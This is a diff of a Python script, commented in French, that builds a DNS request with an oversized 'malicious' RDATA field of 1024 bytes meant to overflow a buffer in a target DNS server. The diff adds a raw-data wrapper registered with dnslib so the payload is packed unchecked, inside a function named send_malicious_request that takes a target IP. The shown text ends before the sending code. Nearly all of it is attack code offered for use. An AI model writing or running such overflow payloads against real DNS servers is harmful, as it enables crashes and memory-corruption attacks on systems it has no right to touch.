@@ -1,16 +1,29 @@
 import socket
-from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE, RR
+from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE, RR, RDMAP
+
+# Utiliser un type brut pour le RDATA
+class RawRData:
+    def __init__(self, data):
+        self.data = data
+
+    def pack(self, *args):
+        return self.data
+
+    def __len__(self):
+        return len(self.data)
+
+# Enregistrer le type brut comme type valide dans dnslib
+RDMAP['RAW'] = RawRData
 
 def send_malicious_request(target_ip, target_port=53):
-    # Prépare une requête DNS avec un RDATA malveillant
     try:
         # Construire l'en-tête de la requête
         header = DNSHeader(id=12345, qr=0, rd=1)
         question = DNSQuestion("example.com", QTYPE.A)
 
-        # Champ malveillant (dépassement de tampon)
-        payload = b"A" * 1024  # Taille exagérée pour déclencher un overflow
-        rr = RR("example.com", QTYPE.A, rdata=payload, ttl=300)
+        # Champ RDATA malveillant (buffer overflow)
+        payload = b"A" * 1024  # Dépassement de mémoire tampon
+        rr = RR("example.com", QTYPE.A, rdata=RawRData(payload), ttl=300)
 
         # Assemblage de la requête DNS
         dns_record = DNSRecord(header, q=question)
